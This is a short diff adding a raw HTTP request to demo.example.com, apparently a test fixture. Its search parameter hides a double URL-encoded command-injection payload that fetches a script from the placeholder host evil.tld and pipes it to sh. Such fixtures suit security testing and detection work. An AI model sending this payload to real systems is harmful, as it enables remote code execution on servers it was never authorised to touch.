@@ -1,0 +1,4 @@
+GET /a?search=curl%2Bhttp%253A%252F%252Fevil.tld%252Fi.sh%2B%257C%2Bsh HTTP/1.1
+Host: demo.example.com
+Connection: close
+
